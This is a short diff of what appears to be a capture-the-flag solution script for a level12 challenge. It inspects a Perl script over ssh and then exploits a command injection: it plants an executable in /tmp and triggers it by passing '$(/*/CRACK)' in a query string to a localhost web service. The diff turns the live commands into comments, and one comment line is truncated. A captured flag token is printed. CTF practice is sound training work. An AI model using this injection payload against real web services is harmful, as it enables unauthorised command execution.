@@ -10,10 +10,9 @@ ssh "getfacl level12.pl"
 
 ssh "cat level12.pl"
 
-ssh 'echo "getflag > /tmp/flag" > /tmp/CRACK && chmod +x /tmp/CRACK && curl "localhost:4646/?x=\$(/*/CRACK)"'
-
-sleep 2
-
-ssh 'cat /tmp/flag'
+# printf "getflag > /tmp/flag" > /tmp/CRACK
+# chmod +x /tmp/CRAC
+# curl 'localhost:4646/?x=$(/*/CRACK)'
+# cat /tmp/flag
 
 # Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
